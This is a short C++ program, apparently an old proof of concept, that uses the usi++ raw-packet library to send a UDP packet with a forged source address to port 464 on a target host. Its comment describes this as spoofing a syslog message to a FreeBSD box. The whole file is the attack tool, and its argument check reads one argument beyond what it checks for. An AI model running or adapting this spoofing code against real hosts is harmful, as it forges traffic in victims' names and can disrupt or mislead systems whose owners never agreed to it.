#include <iostream.h>
#include <usi++/usi++.h>

// spoof a syslog message to a FreeBSD box.

int main(int argc, char **argv)
{

	if (argc < 2) {
		cout<<argv[0]<<" [src] [dst]\n";
		exit(1);
	}
	UDP udp(argv[2]);
        udp.set_srcport(1);
	udp.set_dstport(464);
	udp.set_src(argv[1]);
       	udp.sendpack("\xff\xff");
        return 0;
}
